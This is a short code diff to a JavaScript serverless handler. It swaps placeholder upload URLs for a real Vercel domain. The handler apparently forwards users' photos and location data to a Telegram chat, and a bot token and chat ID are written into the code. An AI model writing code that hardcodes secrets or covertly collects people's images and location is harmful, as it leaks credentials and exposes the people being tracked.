@@ -4,8 +4,8 @@ export default async function handler(req, res) {
 
     const botToken = 'AAHcrDP5UiHtBO9wqeY5Nq6dQg7RAZB4JFM';
     const chatId = '5122187027';
-    const photoUrl = `https://your-domain.com/uploads/${fileName}`;
-    const locationUrl = `https://your-domain.com/uploads/${fileName}.json`;
+    const photoUrl = `https://long-delta.vercel.app//uploads/${fileName}`;
+    const locationUrl = `https://long-delta.vercel.app/uploads/${fileName}.json`;
 
     const message = `
       📸 *Foto dan Lokasi Pengguna* 📍
